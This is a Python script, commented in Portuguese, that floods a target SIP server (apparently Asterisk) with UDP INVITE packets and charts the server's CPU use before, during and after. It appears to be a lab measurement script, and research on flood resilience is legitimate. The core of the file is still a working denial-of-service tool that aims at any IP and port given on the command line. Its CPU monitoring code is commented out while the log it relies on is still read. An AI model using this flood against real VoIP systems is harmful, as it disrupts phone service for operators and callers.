import socket
import time
import csv
import os
import argparse
import subprocess
import pandas as pd
import matplotlib.pyplot as plt
from datetime import datetime

# Argumentos
parser = argparse.ArgumentParser(description="Ataque SIP Flood com monitoramento.")
parser.add_argument("--ip", required=True, help="IP de destino")
parser.add_argument("--porta", type=int, default=5060, help="Porta de destino")
parser.add_argument("--pacotes", type=int, default=1000, help="Número de pacotes")
parser.add_argument("--intervalo", type=float, default=0.001, help="Intervalo entre pacotes (s)")
args = parser.parse_args()

# Criação do pacote SIP
mensagem_sip = f"""INVITE sip:ataque@{args.ip} SIP/2.0
Via: SIP/2.0/UDP 192.168.0.100:{args.porta};branch=z9hG4bK-attack
From: <sip:ataque@{args.ip}>;tag=12345
To: <sip:ataque@{args.ip}>
Call-ID: ataque-{{}}@192.168.0.100
CSeq: 1 INVITE
Contact: <sip:ataque@192.168.0.100>
Max-Forwards: 70
User-Agent: SIPFloodTool
Content-Length: 0

"""

# Paths
os.makedirs("results", exist_ok=True)
log_pidstat = "results/cpu_asterisk_log.txt"
grafico_saida = "results/grafico_status_ataque_flood.png"
dataset_csv = "results/flood_sip_resultados.csv"

# Pega o PID do Asterisk
#print("🔍 Obtendo PID do Asterisk...")
#pid_asterisk = subprocess.check_output("pidof asterisk", shell=True).decode().strip()
#if not pid_asterisk:
#    print("❌ Asterisk não está em execução.")
#    exit(1)

# Inicia monitoramento com pidstat
#print("📈 Iniciando monitoramento de CPU...")
#pidstat_proc = subprocess.Popen(
#    f"pidstat -u -p {pid_asterisk} 1 > {log_pidstat}",
#    shell=True,
#    preexec_fn=os.setsid
#)

# Espera 5s ANTES do ataque
print("⏳ Aguardando 5 segundos antes do ataque...")
time.sleep(5)

# Inicializa socket e ataque
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
inicio = datetime.now()
print(f"\n🚀 Iniciando SIP Flood em {args.ip}:{args.porta} com {args.pacotes} pacotes...")

for i in range(1, args.pacotes + 1):
    pacote = mensagem_sip.format(i)
    sock.sendto(pacote.encode(), (args.ip, args.porta))
    if i % 100 == 0 or i == args.pacotes:
        print(f"📤 Pacote {i} enviado")
    time.sleep(args.intervalo)

fim = datetime.now()
print(f"\n✅ Ataque finalizado. Durou {round((fim - inicio).total_seconds(), 2)} segundos.")

# Espera 5s DEPOIS do ataque
print("⏳ Aguardando 5 segundos após o ataque...")
time.sleep(5)

# Finaliza pidstat
print("🛑 Finalizando monitoramento...")
#pidstat_proc.terminate()
time.sleep(1)

# Gera gráfico
print("📊 Gerando gráfico...")

tempos, cpu_usos = [], []
with open(log_pidstat) as f:
    for linha in f:
        if linha.startswith("#") or "Linux" in linha or "UID" in linha or not linha.strip():
            continue
        partes = linha.split()
        if len(partes) >= 8:
            tempos.append(len(tempos))
            cpu_usos.append(float(partes[7]))  # %usr

df = pd.DataFrame({"Tempo (s)": tempos, "Uso de CPU (%)": cpu_usos})
df.to_csv("results/cpu_monitorado.csv", index=False)

plt.figure(figsize=(10, 5))
plt.plot(tempos, cpu_usos, marker="o", linestyle="-", color="blue", label="CPU Asterisk")
plt.axvspan(5, 5 + int(args.pacotes * args.intervalo), color="red", alpha=0.3, label="Período do Ataque")
plt.xlabel("Tempo (s)")
plt.ylabel("Uso de CPU (%)")
plt.title("Uso de CPU antes, durante e após o ataque SIP Flood")
plt.legend()
plt.grid(True)
plt.tight_layout()
plt.savefig(grafico_saida)
print(f"✅ Gráfico salvo em {grafico_saida}")

# Salvar resumo do ataque
with open(dataset_csv, mode="w", newline="") as csvfile:
    writer = csv.writer(csvfile)
    writer.writerow([
        "timestamp_inicio", "timestamp_fim",
        "ip_destino", "porta_destino",
        "quantidade_pacotes", "intervalo_entre_pacotes", "duracao_segundos"
    ])
    writer.writerow([
        inicio.strftime("%Y-%m-%d %H:%M:%S"),
        fim.strftime("%Y-%m-%d %H:%M:%S"),
        args.ip, args.porta,
        args.pacotes, args.intervalo,
        round((fim - inicio).total_seconds(), 2)
    ])

print(f"📂 Resultados salvos em:\n  - {dataset_csv}\n  - {log_pidstat}\n  - {grafico_saida}")
